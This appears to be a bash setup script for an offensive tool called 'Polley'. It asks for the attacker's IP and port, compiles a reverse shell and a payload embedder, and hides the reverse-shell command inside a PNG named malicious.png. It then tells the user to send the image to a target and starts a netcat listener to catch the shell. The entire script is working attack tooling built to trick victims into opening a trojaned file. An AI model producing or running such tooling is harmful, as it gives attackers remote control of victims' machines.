#!/bin/bash

# Dependency Check
if ! ldconfig -p | grep -q libpng; then
    echo "[!] libpng not found. Installing dependencies..."
    sudo apt update && sudo apt install libpng-dev netcat-traditional -y
fi

# Get the User's IP so the victim connects to THEM
echo "--- Polley Setup ---"
read -p "Enter your IP address (LHOST): " MY_IP
read -p "Enter your Port (LPORT) [default 4444]: " MY_PORT
MY_PORT=${MY_PORT:-4444}

echo "[*] Compiling binaries..."
# Compile the shell with the user's IP/Port as arguments
gcc reverse_shell.c -o reverse_shell
gcc embed_payload.c -o embed_payload -lpng

echo "[*] Embedding payload for IP: $MY_IP"
# This passes the user's info to the embedder
./embed_payload benign.png malicious.png "./reverse_shell $MY_IP $MY_PORT"

echo "[*] Done! Send malicious.png to the target."
echo "[*] Starting listener on port $MY_PORT..."
nc -lvnp $MY_PORT
